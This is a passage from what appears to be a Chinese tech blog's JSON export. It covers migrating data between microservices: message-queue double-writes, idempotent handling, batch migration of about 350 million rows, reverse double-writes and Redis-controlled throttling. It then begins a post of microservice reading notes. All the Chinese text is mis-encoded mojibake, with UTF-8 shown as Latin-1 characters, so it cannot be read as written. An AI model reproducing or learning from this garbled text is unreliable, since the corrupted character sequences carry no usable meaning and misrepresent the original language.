æµªè´¹å®è´µçš„ä¸€åˆ†é’Ÿæ—¶é—´æ¥é˜…è¯»ï¼Œå†ä¼šã€‚è¿™ä¸ªæ–¹æ¡ˆè¿‡äºç®€å•ï¼Œåªé€‚ç”¨äºæœ€æœ€æœ€æœ€æœ€ç®€å•çš„åœºæ™¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“éœ€è¦è¿ç§»çš„æ•°æ®åŸºæœ¬ä¸Šæ˜¯é™æ€çš„ï¼Œåœ¨ä¸šåŠ¡è¿ç§»è¿‡ç¨‹ä¸­ä¸€ç‚¹éƒ½ä¸ä¼šå˜çš„æ—¶å€™ï¼Œæ‰å¯ä»¥ç”¨è¿™ç§æ–¹æ¡ˆã€‚ä½†é€šå¸¸æˆ‘ä»¬éœ€è¦è¿ç§»çš„æ•°æ®å¤§å¤šéƒ½æ˜¯ç”¨æˆ·æ•°æ®ï¼Œä¼šä¸æ–­å˜åŒ– / å¢é•¿ï¼Œæœ‰æ—¶è¿˜ä¼šå‡ºç°åˆ é™¤çš„æƒ…å†µï¼Œè€Œä¸”æ•°æ®é‡è¾ƒå¤§ï¼Œè¿™ä¸ªæ—¶å€™å¾ˆéš¾å†é€šè¿‡é™æ€å¯¼å‡º â†’ å¯¼å…¥çš„æ–¹å¼è¿ç§»æ•°æ®ã€‚ä¸€èˆ¬è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬éƒ½ä¼šé‡‡å–åŒå†™çš„æ–¹å¼æ¥è¿ç§»æ•°æ®ã€‚ 1.2 åŸºäºåŒå†™çš„æ•°æ®è¿ç§»ä»€ä¹ˆå«â€œåŒå†™â€å‘¢ï¼Ÿç®€å•åœ°è®²ï¼Œå°±æ˜¯åœ¨ A çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé€šè¿‡æŸç§æ–¹å¼ï¼ˆå¦‚æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸‹ç§° MQï¼‰å¼‚æ­¥é€šçŸ¥åˆ° Bï¼Œç„¶å B ä¸šåŠ¡å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ã€‚è¿™ç§æ–¹å¼æœ‰ç‚¹åƒ MySQL åŸºäº binlog çš„ä¸»ä»åŒæ­¥ï¼Œä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼šå»ºç«‹åŒå†™æœºåˆ¶é€šè¿‡ MQ å»ºç«‹ A â†’ B çš„å•å‘é€šè·¯ï¼Œåœ¨ A å¤„ç†æ•°æ®ä¿®æ”¹åï¼Œé€šè¿‡ MQ å‘é€æ¶ˆæ¯ï¼Œå†…å«ä¸€ä»½æœ€æ–°ç‰ˆæœ¬çš„æ•°æ®ï¼›B åœ¨æ”¶åˆ°æ¶ˆæ¯åï¼Œæ ¹æ®æ¶ˆæ¯å†…å®¹å¯¹æ•°æ®è¡¨è¿›è¡Œæ’å…¥æˆ–æ›´æ–°æ“ä½œï¼Œä»¥ä¿è¯æ•°æ®çŠ¶æ€ä¸ MQ ä¸­çš„æ¶ˆæ¯ä¸€è‡´ã€‚è¿™æ ·ï¼ŒA ä¸­çš„æ•°æ®æ›´æ–°åï¼ŒB ä¸­å¯¹åº”çš„æ•°æ®ä¹Ÿå°±èƒ½å¾ˆå¿«åœ°åŒæ­¥ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨å¤„ç†æ¶ˆæ¯æ—¶ï¼Œé€šå¸¸ä¼šä¿è¯å¤„ç†é€»è¾‘æ˜¯å¹‚ç­‰çš„ã€‚å¹‚ç­‰é€»è¾‘çš„ä½œç”¨ï¼Œä¼šåœ¨ä¸‹ä¸€æ­¥æœ‰æ‰€ä½“ç°ã€‚å†å²æ•°æ®è¿ç§»ä¸Šé¢çš„é€šè·¯å»ºç«‹åï¼Œæœ€è¿‘å‘ç”Ÿå˜åŒ–çš„æ•°æ®ä¼šè¿›è¡Œæ›´æ–°ï¼Œä½†å¤§å¤šæ•°æ®ä¸ä¼šè¢«æ›´æ”¹ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸ä¼šè¿›è¡ŒåŒæ­¥ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±éœ€è¦æˆ‘ä»¬æŠŠæ‰€æœ‰å†å²æ•°æ®å…¨éƒ¨å¯¼å…¥ B æœåŠ¡ä¸­ã€‚ä½†åœ¨å®é™…æ“ä½œä¸­ï¼Œæˆ‘ä»¬å¾ˆéš¾åˆ¤æ–­å“ªäº›æ•°æ®æ˜¯æ²¡æœ‰è¢«æ›´æ–°è¿‡çš„å†å²æ•°æ®ã€‚ä¸è¿‡åœ¨å¹‚ç­‰åŒå†™æœºåˆ¶çš„å¸®åŠ©ä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿä¸éœ€è¦åšè¿™ä¸ªåˆ¤æ–­â€”â€”ç¼–å†™è¿ç§»è„šæœ¬ï¼Œç›´æ¥æŠŠè¡¨ä¸­çš„æ•°æ®éå†ä¸€éï¼Œé€šè¿‡åŒå†™é€šè·¯å‘è¿‡å»å°±å¥½äº†ï¼Œåæ­£ç›¸åŒçš„æ¶ˆæ¯åœ¨ B é‚£è¾¹å¤„ç†ä¸¤éçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚æ ¡éªŒæ•°æ®å®Œæ•´æ€§é€šè¿‡æŸäº›æ–¹æ³•ï¼ˆå¦‚æœåŠ¡é—´è°ƒç”¨ï¼‰è·å–æ•°æ®ï¼Œå°†æ–°è€æ•°æ®è¿›è¡Œå¯¹æ¯”ï¼Œç¡®ä¿è¿ç§»è¿‡ç¨‹ä¸­æœªäº§ç”Ÿæ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±æŠŠ A æ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½è¿ç§»åˆ°äº† B æ•°æ®åº“ä¸­ï¼Œè€Œä¸”åœ¨ A çš„æ•°æ®å‘ç”Ÿå˜åŒ–çš„åŒæ—¶ï¼ŒB ä¹Ÿå¯ä»¥åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…ï¼ˆé€šå¸¸ä¸åˆ° 0.5sï¼‰å®Œæˆæ›´æ–°ã€‚åŒå†™æ—¶ï¼Œéœ€è¦é’ˆå¯¹ä¸åŒç±»å‹çš„æ•°æ®åˆ¶å®šä¸åŒçš„è¿ç§»æ–¹æ¡ˆå’Œæ¶ˆæ¯æ ¼å¼ï¼šå†…å®¹æ•°æ®å†…å®¹æ•°æ®ä¸­æ¯è¡ŒåªåŒ…å«å„ç§å†…å®¹ï¼Œè¿™ç§æ•°æ®æˆ‘ä»¬é€šå¸¸éƒ½ä¼šé€šè¿‡ä¸»é”®ï¼ˆå¦‚ id åˆ—ï¼‰å»æ ‡æ˜å”¯ä¸€æ€§ã€‚æ­¤æ—¶ï¼ŒåŒå†™æ•°æ®åº”åŒ…å«è¡Œ IDï¼Œä»¥åŠè¯¥è¡Œä¸‹çš„æ‰€æœ‰éœ€è¦è¿ç§»çš„å†…å®¹ã€‚ä¸šåŠ¡åœ¨å¤„ç†åŒå†™æ•°æ®æ—¶ï¼Œä¼šæ ¹æ® ID åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ã€‚æ•°æ®ä¸å­˜åœ¨æ—¶åˆ™è¿›è¡Œæ’å…¥ï¼Œæ•°æ®å­˜åœ¨æ—¶åˆ™å¯¹ç°æœ‰æ•°æ®è¿›è¡Œæ›´æ–°ã€‚å…³ç³»æ•°æ®ä¸å†…å®¹æ•°æ®ä¸åŒï¼Œè¡¨æ˜å®ä½“é—´å…³ç³»çš„æ•°æ®ä¸­ä¸»é”®çš„åœ°ä½å¹¶æ²¡æœ‰é‚£ä¹ˆé«˜ï¼ŒçœŸæ­£æ ‡æ˜å”¯ä¸€æ€§çš„å­—æ®µå¯èƒ½æ˜¯è¡¨ä¸­çš„ä¸€åˆ°å¤šä¸ªå¤–é”®ã€‚æ­¤æ—¶ï¼ŒåŒå†™æ•°æ®å¯ä»¥ä¸è€ƒè™‘ IDï¼Œè€Œåªæä¾›å¤–é”®å€¼å’Œå…¶ä»–é™„åŠ å†…å®¹ã€‚ç±»ä¼¼åœ°ï¼Œä¸šåŠ¡åœ¨å¤„ç†æ•°æ®æ—¶ï¼Œä¼šé€šè¿‡å¤–é”®æ¥æ£€ç´¢ç°æœ‰æ•°æ®ã€‚ç¼“å­˜æ•°æ®è¿™é‡Œçš„â€œç¼“å­˜æ•°æ®â€æ˜¯æŒ‡ç”±ç°æœ‰å†…å®¹ç»åŠ å·¥åç”Ÿæˆçš„æ•°æ®ï¼Œæ¯”å¦‚æ–‡æœ¬åˆ†æç»“æœã€æˆ–ç»Ÿè®¡æ•°æ®ç­‰ã€‚è¿™äº›æ•°æ®å¦‚æœæ–¹ä¾¿é‡ç®—ï¼Œåˆ™æ²¡æœ‰è¿ç§»çš„å¿…è¦â€”â€”è¿ç§»è¿‡å»é‡æ–°è®¡ç®—å°±å¯ä»¥äº†ã€‚ 2. æ€ä¹ˆåšä¸šåŠ¡è¿‡æ¸¡ï¼Ÿç›¸åŒçš„ä¸šåŠ¡é€»è¾‘å‡ºç°ä¸¤éï¼Œå°±æ¯”è¾ƒå®¹æ˜“ç ´åä¸¤è¾¹ä¸šåŠ¡çš„ä¸€è‡´æ€§ï¼Œæ‰€ä»¥é™¤äº†æ•°æ®è¿ç§»å¤–ï¼Œæ•°æ®çš„å¤„ç†é€»è¾‘é€šå¸¸ä¹Ÿä¼šç”±ä¸šåŠ¡ A è¿ç§»è‡³ä¸šåŠ¡ Bã€‚è¿™å°±è¦æ±‚åœ¨ B ç«¯æ„å»ºç›¸åŒæˆ–ç›¸ä¼¼çš„ä¸šåŠ¡é€»è¾‘å’Œæ¥å£ï¼Œç„¶åå°† A ç«¯çš„è°ƒç”¨è¿ç§»åˆ° B ç«¯å»ã€‚æ­¤æ—¶é€šå¸¸æœ‰ä¸‰ç§æ–¹æ¡ˆï¼šå®¢æˆ·ç«¯åˆ‡æ¢ã€è·¯ç”±åˆ‡æ¢å’Œä¸šåŠ¡ä»£ç†ã€‚ä¸å¥½æ„æ€è¿™ä»¨è¯éƒ½æ˜¯æˆ‘çç¼–çš„ã€‚å®¢æˆ·ç«¯åˆ‡æ¢å¯¹äºåç«¯æ¥è¯´ï¼Œè¿™æ˜¯æœ€ç®€å•çš„ä¸€ç§ï¼šä»€ä¹ˆéƒ½ä¸ç”¨åšï¼Œåªéœ€å®ç°å®¢æˆ·ç«¯ä¿®æ”¹ä»£ç ï¼Œå°†ä¹‹å‰å¯¹ A æœåŠ¡çš„è°ƒç”¨æ”¹ä¸ºå¯¹ B æœåŠ¡çš„è°ƒç”¨ï¼Œè¿™æ ·ä¹Ÿå°±å®Œæˆäº†é€»è¾‘åˆ‡æ¢ã€‚ä½†å¯¹äºæŸäº›å®¢æˆ·ç«¯æ¥è¯´ï¼Œé€šè¿‡å®¢æˆ·ç«¯åˆ‡æ¢æ‰€æœ‰æµé‡å¹¶ä¸ç°å®ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦åœ¨åç«¯å®ç°å‘å‰å…¼å®¹ï¼šå¯¹è€å®¢æˆ·ç«¯ä¿ç•™è€æ¥å£ï¼Œä½†è¦é€šè¿‡æŸç§æ–¹å¼å°†é€»è¾‘è½¬ç§»åˆ°æ–°æœåŠ¡ä¸Šã€‚è·¯ç”±åˆ‡æ¢è¿™ä¸ªæ¶‰åŠåˆ°äº†ä¸€äº›è¿ç»´æ“ä½œã€‚ç®€å•æ¥è®²ï¼Œå°±æ˜¯åœ¨ B æœåŠ¡ä¸­å®ç°ä¸€ä»½æ¥å£ï¼Œè¦æ±‚ä¸ A çš„æ¥å£æè¿°ä¸æ¥å£é€»è¾‘ä¿æŒå®Œå…¨ä¸€è‡´ã€‚ç„¶åï¼Œé€šè¿‡ä¸Šå±‚æœåŠ¡å™¨çš„è·¯ç”±è§„åˆ™ï¼Œå°†æ‰€æœ‰ A çš„æ¥å£è°ƒç”¨é‡å®šå‘åˆ° B å³å¯ã€‚è¿™ç§æ–¹æ¡ˆåŒæ ·ç®€ä¾¿å¯è¡Œï¼Œä½†ä¼šå°†ä¸šåŠ¡çš„ç‰¹æ®Šè§„åˆ™å¸¦åˆ°æœåŠ¡å™¨é…ç½®ä¸­ï¼Œè¿™æ ·ä¼šå°†é…ç½®å¤æ‚åŒ–ï¼Œä¸åˆ©äºè¿ç»´æ“ä½œã€‚ä¸šåŠ¡ä»£ç†è¿™ç§æ–¹æ³•è¾ƒä¸ºå¤æ‚ï¼Œä½†å¯ä»¥æŠŠæ‰€æœ‰å·¥ä½œé‡éƒ½æ”¾åœ¨åç«¯ï¼Œä¸æ¶‰åŠåˆ°å…¶å®ƒéƒ¨é—¨ã€‚è€Œä¸”ï¼Œå½“ A ä¸­çš„ç°æœ‰é€»è¾‘éå¸¸å¤æ‚æ—¶ï¼Œé€šå¸¸ä¹Ÿåªä¼šè€ƒè™‘è¿™ç§æ–¹æ¡ˆã€‚å…·ä½“æ¥è®²ï¼Œå°±æ˜¯åœ¨ B ä¸­å®ç°å†…éƒ¨ RPC / API æ¥å£ï¼Œç„¶ååœ¨ A ä¸­ç§»é™¤å¯¹ç°æœ‰æ•°æ®åº“çš„è¯»å†™ä¾èµ–ï¼Œæ”¹ä¸ºè¿›è¡ŒæœåŠ¡é—´è°ƒç”¨ã€‚è¿™æ ·ï¼ŒA çš„æ¥å£å¾—ä»¥ä¿ç•™ï¼Œä½†ä¸šåŠ¡é€»è¾‘å·²ç»è½¬ç§»åˆ°äº† B ä¸­ã€‚ 3. ä¸€äº›æç«¯çš„åœºæ™¯è¦å¦‚ä½•åº”å¯¹ï¼Ÿ 3.1 æ•°æ®å¯èƒ½ä¼šè¢«åˆ é™¤è¿™ç§æƒ…å†µçš„è§£å†³æ–¹æ¡ˆç®€å•ç²—æš´ï¼šé’ˆå¯¹åˆ é™¤çš„æ“ä½œæ–°å»ºä¸€æ¡åŒå†™é€šè·¯ï¼Œæˆ–åœ¨ç°æœ‰çš„æ¶ˆæ¯ä¸­æ·»åŠ ç‰¹å®šä¿¡æ¯ä»¥æ ‡è®°è¯¥æ¶ˆæ¯è¡¨ç¤ºçš„æ˜¯æ›´æ–°è¿˜æ˜¯åˆ é™¤æ“ä½œã€‚ä½†è¦æ³¨æ„ä¸€ç‚¹ï¼šåˆ é™¤æ¶ˆæ¯çš„å¤„ç†é€»è¾‘æœ€å¥½ä¹Ÿæ˜¯å¹‚ç­‰æ“ä½œã€‚ 3.2 æ•°æ®é‡æå¤§å½“æ•°æ®é‡å¾ˆå¤§ï¼Œå¦‚è¾¾åˆ°äº¿çº§åˆ«æ—¶ï¼Œè¿ç§»å†å²æ•°æ®çš„è€—æ—¶ä¼šå¾ˆä¹…ï¼Œæ­¤å¤–ï¼Œå¹‚ç­‰é€»è¾‘çš„å­˜åœ¨ä¹Ÿä¼šæ‹–æ…¢æ¶ˆæ¯çš„å¤„ç†é€Ÿåº¦ã€‚æ­¤æ—¶ï¼Œå¯ä»¥è€ƒè™‘è¿›è¡Œå¤šæ®µã€ä¸åŒç²’åº¦çš„è¿ç§»ã€‚æ­¤å‰ï¼Œæˆ‘ä»¬åœ¨åŒå†™ / æ•°æ®è¿ç§»æ—¶ï¼Œéƒ½æ˜¯ä¸€æ¡ä¸€æ¡æ•°æ®å»è¿ç§»çš„ï¼Œæ¥æ”¶ç«¯æ’å…¥æ•°æ®ä¹ŸåŒæ ·æ˜¯ä¸€æ¡ä¸€æ¡æ¥æ’å…¥ã€‚ä½†å¦‚æœæˆ‘ä»¬ä¸€æ¬¡æ€§æŠŠå¤šæ¡æ•°æ®è¿›è¡Œæ‰“åŒ…ï¼Œåœ¨ä¸€æ¡æ¶ˆæ¯ä¸­å‘é€å¤šæ¡æ•°æ®å†…å®¹ï¼Œæ¥æ”¶ç«¯ä¹Ÿå°±å¯ä»¥ä½¿ç”¨ä¸€æ¡è¯­å¥æ¥æ’å…¥å¤šæ¡æ•°æ®ã€‚ä½†è¿™æ ·æ“ä½œçš„è¯ï¼Œæ¶ˆæ¯å¤„ç†é€»è¾‘çš„å¹‚ç­‰æ€§å°±å¾ˆéš¾ä¿è¯ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šé‡‡ç”¨ä»¥ä¸‹ç­–ç•¥ï¼šé¦–å…ˆï¼Œé€šè¿‡æ‰¹é‡è¿ç§»çš„æ–¹å¼è¿ç§»æ•°æ®åº“ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œæ­¤æ—¶æ²¡æœ‰åŒå†™ä¿¡å·ï¼Œæ‰€ä»¥æ¶ˆæ¯æ¥æ”¶æ–¹åªè´Ÿè´£å°†æ•°æ®æ— è„‘æ’å…¥ï¼›ç¬¬äºŒæ­¥ï¼Œä¸Šçº¿é’ˆå¯¹å•æ¡æ•°æ®çš„åŒå†™é€»è¾‘ï¼Œæ­¤æ—¶çš„æ¶ˆæ¯å¤„ç†åº”è¯¥æ˜¯å¹‚ç­‰çš„ï¼›ç¬¬ä¸‰æ­¥ï¼Œæ‰¾å‡ºæ‰€æœ‰æ‰¹é‡è¿ç§»å¼€å§‹åæ–°äº§ç”Ÿçš„æ•°æ®ï¼Œå°†å…¶é€šè¿‡åŒå†™æ¥å£è¿›è¡Œè¿ç§»ï¼›æ­¤æ—¶ï¼Œç”±äºå¤„ç†æ–¹çš„å¹‚ç­‰æ€§ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿è¯æ‰¾åˆ°çš„æ•°æ®åªå¤šä¸å°‘å³å¯ã€‚æ‰€ä»¥ï¼Œæ­¤æ­¥è¿ç§»æ•°æ®çš„æ—¶é—´ç‚¹åˆ’åˆ†å¯ä»¥è®¾ä¸ºæ‰¹é‡è¿ç§»å¼€å§‹æ—¶é—´çš„æ•°å°æ—¶å‰ã€‚æœ€åï¼Œæ ¡éªŒæ•°æ®å®Œæ•´æ€§ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±æé«˜äº†æ•°æ®è¿ç§»çš„æ•´ä½“é€Ÿåº¦ã€‚ä¸¾ä¸ªå…·ä½“ä¾‹å­æ¥è¡¨æ˜æˆæœï¼šæœ‰ä¸€ä¸ªé¡¹ç›®éœ€è¦è¿ç§» 3.5 äº¿å·¦å³çš„æ•°æ®åˆ°æ–°åº“ï¼Œè€Œå•æ¡æ•°æ®è¿ç§»çš„ååé‡å¤§æ¦‚åœ¨æ¯åˆ†é’Ÿ 10000 æ¡ã€‚æŒ‰ç…§è¿™ä¸ªé€Ÿç‡ï¼Œå°†æ‰€æœ‰æ•°æ®å®Œæ•´è¿ç§»éœ€è¦ 25 å¤©ã€‚è€Œæˆ‘ä»¬é‡‡ç”¨äº†æ‰¹é‡è¿ç§»çš„æ–¹æ³•ï¼Œåœ¨ç¬¬ä¸€æ­¥æ—¶ï¼Œéå†æ‰€æœ‰ç”¨æˆ·ï¼Œå°†æ¯ä¸ªç”¨æˆ·çš„æ‰€æœ‰æ•°æ®æ‰“åŒ…ä¸ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€šè¿‡ MQ è¿ç§»ã€‚è¿™ä¸€æ­¥åªç”¨äº† 27 ä¸ªå°æ—¶å°±è¿ç§»äº†å¤§éƒ¨åˆ†æ•°æ®ã€‚ç„¶åï¼Œä¸Šçº¿äº†å¹‚ç­‰çš„åŒå†™é€»è¾‘ï¼Œå†èŠ±è´¹ä¸åˆ° 4 å°æ—¶å¯¹æ–°äº§ç”Ÿçš„æ•°æ®è¿›è¡Œè¿ç§»ã€‚è¿™æ ·æˆ‘ä»¬åªç”¨äº†ä¸åˆ° 31 å°æ—¶å°±å°†æ‰€æœ‰æ•°æ®è¿ç§»å®Œæˆï¼Œè¿ç§»é€Ÿç‡æé«˜äº† 18 å€ã€‚ä¸ºäº†ä¿é™©ï¼Œæˆ‘ä»¬åœ¨æ‰¹é‡è¿ç§»æ— äººå€¼å®ˆï¼ˆå¦‚åŠå¤œï¼‰çš„æ—¶å€™æŠŠè¿ç§»é€Ÿç‡è°ƒçš„å¾ˆä½ã€‚äº‹å®ä¸Šé‚£ä¸ªæ—¶å€™æ˜¯å‡ ä¹æ²¡æœ‰è¯·æ±‚çš„ï¼Œå¦‚æœæŠŠé€Ÿç‡è°ƒé«˜ï¼Œå¯ä»¥ä½¿æ‰¹é‡è¿ç§»çš„æ—¶é—´ç¼©çŸ­ 4 å°æ—¶ä»¥ä¸Šã€‚æ­¤å¤–ï¼Œåœ¨æ‰¹é‡è¿ç§»çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜å¯ä»¥åº”ç”¨ä¸€äº›å°æŠ€å·§ï¼šæ‰¹é‡è¿ç§»æ—¶å¦‚æœå•æ‰¹æ•°æ®é‡è¿‡å¤§ï¼Œä¸ºé¿å…æ¶ˆæ¯å †ç§¯å ç”¨ MQ å†…å­˜ï¼Œæ¶ˆæ¯å¯ä»¥åœ¨æ”¾å…¥ MQ å‰è¿›è¡Œå‹ç¼©ï¼›åœ¨è¿›è¡Œç²—ç²’åº¦æ•°æ®è¿ç§»æ—¶ï¼Œå¯ä»¥è€ƒè™‘å…³é—­æˆ–å»é™¤æ¥æ”¶æ–¹çš„æ•°æ®åº“çº¦æŸæ£€æŸ¥ï¼Œä»¥æé«˜æ¥æ”¶æ–¹æ•°æ®å†™å…¥çš„é€Ÿç‡ã€‚æ­¤æ—¶ï¼Œæ•°æ®å®Œæ•´æ€§ç”±å‘é€æ–¹æ¥ä¿è¯ã€‚ç²—ç²’åº¦è¿ç§»è¿‡åï¼Œåœ¨ä¸Šçº¿å¹‚ç­‰çš„ç»†ç²’åº¦è¿ç§»å‰ï¼Œå†æ¢å¤æ•°æ®åº“çº¦æŸã€‚ 3.3 æ— æ³•ä¸€æ¬¡æ€§è¿ç§»æ‰€æœ‰æ•°æ®é€»è¾‘æœ‰æ—¶ä¸šåŠ¡é€»è¾‘å¤æ‚ï¼Œè¿ç§»æˆæœ¬å¾ˆé«˜ï¼Œæ— æ³•ä¸€æ¬¡æ€§åœ°å°†æ¥å£å…¨éƒ¨è¿ç§»è¿‡å»ã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦é‡‡å–ä¸€äº›â€œæ›²çº¿æ•‘å›½â€çš„ç­–ç•¥ï¼Œè®©ä¸¤ç«¯çš„æ•°æ®ä¿æŒä¸€è‡´ï¼Œä¸”æœåŠ¡åŒæ—¶å¯ç”¨ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ  B â†’ A çš„åå‘åŒå†™æœºåˆ¶ã€‚é€šè¿‡ B æœåŠ¡çš„æ¥å£äº§ç”Ÿçš„æ•°æ®ï¼Œå°†ä¼šç»è¿‡åå‘åŒå†™çš„é€šé“å›å†™è‡³ A ä¸­ã€‚è¿™æ ·ï¼Œä¸¤ç«¯æ•°æ®å°±èƒ½ä¿æŒåŒæ­¥ã€‚æ­¤æ—¶å†æ…¢æ…¢åœ°è¿ç§» A çš„ä¸šåŠ¡é€»è¾‘å³å¯ã€‚ä¸è¿‡åœ¨æ„å»ºåå‘åŒå†™æ—¶ï¼Œéœ€è¦æ ¼å¤–æ³¨æ„ä¸¤ç«¯æ•°æ®æµå‘ï¼Œä»¥é¿å…åŒå†™â€œæ­»å¾ªç¯â€çš„äº‹æ•…å‡ºç°ã€‚ 3.4 éœ€è¦å¯¹è¿ç§»é€Ÿç‡è¿›è¡Œæ§åˆ¶å˜›ï¼Œè¿™ä¸ªå…¶å®å¹¶ä¸æ˜¯ç‰¹æ®Šåœºæ™¯äº†ï¼Œä¸ªäººè§‰å¾—æ›´åƒæ˜¯ä¸€ä¸ªç¼–å†™è¿ç§»è„šæœ¬æ—¶çš„å¿…å¤‡éœ€æ±‚ã€‚æˆ‘ä»¬è¿ç§»æ•°æ®æ—¶ï¼Œä¸šåŠ¡å¸¸å¸¸éƒ½æ˜¯åœ¨çº¿çš„ã€‚å¦‚æœæ•°æ®è¿ç§»é€Ÿç‡è¿‡å¿«ï¼Œä¼šåŠ é‡æ•°æ®åº“çš„è´Ÿæ‹…ï¼Œä»è€Œç»™ç›¸å…³ä¸šåŠ¡å¸¦æ¥å½±å“ï¼›å¦‚æœè¿ç§»é€Ÿç‡è¿‡æ…¢ï¼Œåˆä¼šæµªè´¹ä¸€äº›æ—¶é—´ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¦åœ¨ä¸å½±å“ä¸šåŠ¡çš„æƒ…å†µä¸‹ï¼Œå°½é‡å¿«åœ°è¿›è¡Œæ•°æ®è¿ç§»ã€‚è€Œè¿ç§»çš„é€Ÿç‡ï¼Œå¯ä»¥ç”±æˆ‘ä»¬æ¥æ§åˆ¶ï¼Œä»è€ŒåŠ¨æ€åœ°è¿›è¡Œè°ƒæ•´ã€‚å¸¸è§çš„è°ƒé€Ÿé€»è¾‘å¦‚ä¸‹ï¼šé€šè¿‡ä¸€è½®æ•°æ®åº“æŸ¥è¯¢ï¼Œå–å‡ºä¸€æ‰¹æ•°æ®ï¼ˆå¦‚ 1000 æ¡ï¼‰ï¼›å°†è¿™äº›æ•°æ®æ‰“åŒ…æˆæ¶ˆæ¯å‘é€å‡ºå»ï¼›ä» Redis çš„ä¸€ä¸ªé”®ä¸­è¯»å–ä¸€ä¸ªå€¼ï¼Œå¹¶ä¾æ®è¿™ä¸ªå€¼æ¥ sleep ä¸€æ®µæ—¶é—´ï¼›sleep ç»“æŸåï¼Œå†å»æ•°æ®åº“ä¸­å–ä¸‹ä¸€æ‰¹æ•°æ®ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨è¿ç§»æ•°æ®çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡æ›´æ”¹ Redis ä¸­çš„å€¼ï¼Œæ¥äººå·¥å¹²é¢„è¿ç§»è¿›ç¨‹çš„è¿ç§»é€Ÿç‡äº†ã€‚ä»¥ä¸Šï¼Œå°±æ˜¯æœ¬æ–‡çš„å…¨éƒ¨å†…å®¹ã€‚å¦‚æœæœ‰ä»€ä¹ˆç»éªŒæˆ–ç–‘é—®ï¼Œæ¬¢è¿åœ¨è¯„è®ºä¸­åˆ†äº«æˆ–äº¤æµã€‚ä¸è¦å‘ä¸‹é¢é‚£ä¸‰ä½æŠ±å¤§è…¿çš„äººå­¦ä¹ å•ŠğŸŒš","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://blog.stdioa.com/categories/å¼€å‘/"}],"tags":[{"name":"å¾®æœåŠ¡","slug":"å¾®æœåŠ¡","permalink":"https://blog.stdioa.com/tags/å¾®æœåŠ¡/"},{"name":"æ•°æ®è¿ç§»","slug":"æ•°æ®è¿ç§»","permalink":"https://blog.stdioa.com/tags/æ•°æ®è¿ç§»/"},{"name":"åç«¯å¼€å‘","slug":"åç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/åç«¯å¼€å‘/"}]},{"title":"ã€Šä» 0 å¼€å§‹å­¦å¾®æœåŠ¡ã€‹é˜…è¯»ç¬”è®°","slug":"geektime-microservice-notes","date":"2019-03-30T11:40:00.000Z","updated":"2019-03-30T11:58:25.697Z","comments":true,"path":"2019/03/geektime-microservice-notes/","link":"","permalink":"https://blog.stdioa.com/2019/03/geektime-microservice-notes/","excerpt":"å‰ä¸€é˜µå­è´­ä¹°äº†èƒ¡å¿ æƒ³è€å¸ˆçš„ã€Šä» 0 å¼€å§‹å­¦å¾®æœåŠ¡ã€‹æå®¢æ—¶é—´ä¸“æ ï¼ŒäºŒæœˆä»½çœ‹å®Œä»¥ååšäº†ä¸€äº›ç¬”è®°ã€‚","text":"å‰ä¸€é˜µå­è´­ä¹°äº†èƒ¡å¿ æƒ³è€å¸ˆçš„ã€Šä» 0 å¼€å§‹å­¦å¾®æœåŠ¡ã€‹æå®¢æ—¶é—´ä¸“æ ï¼ŒäºŒæœˆä»½çœ‹å®Œä»¥ååšäº†ä¸€äº›ç¬”è®°ã€‚ æœåŠ¡åŒ–æ‹†åˆ†æ ¹æ®æˆ‘çš„å®é™…é¡¹ç›®ç»éªŒï¼Œä¸€æ—¦å•ä½“åº”ç”¨åŒæ—¶è¿›è¡Œå¼€å‘çš„äººå‘˜è¶…è¿‡ 10 äººï¼Œå°±ä¼šé‡åˆ°ä¸Šé¢çš„é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™å°±è¯¥è€ƒè™‘è¿›è¡ŒæœåŠ¡åŒ–æ‹†åˆ†äº†ã€‚æœåŠ¡åŒ–æ‹†åˆ†çš„ä¸¤ç§å§¿åŠ¿ï¼šçºµå‘æ‹†åˆ†ï¼šæŒ‰ä¸šåŠ¡ç»´åº¦æ‹†åˆ†ï¼Œå…³è”æ¯”è¾ƒå¯†åˆ‡çš„å‡ ä¸ªä¸šåŠ¡ä¸šåŠ¡é€‚åˆæ‹†æˆå¾®æœåŠ¡ï¼›åŠŸèƒ½ç›¸å¯¹ç‹¬ç«‹çš„ä¸šåŠ¡æ‹†æˆå¾®æœåŠ¡ï¼›æ¨ªå‘æ‹†åˆ†ï¼šä»å…¬å…±ä¸”ç‹¬ç«‹åŠŸèƒ½ç»´åº¦æ‹†åˆ†ã€‚æ ‡å‡†æ˜¯æ˜¯å¦æœ‰å…¬å…±çš„æœåŠ¡è¢«å¤šä¸ªå…¶å®ƒæœåŠ¡è°ƒç”¨ï¼Œä¸”ä¾èµ–çš„èµ„æºç‹¬ç«‹ä¸ä¸å…¶ä»–ä¸šåŠ¡è€¦åˆã€‚ å¾®æœåŠ¡æ¶æ„ 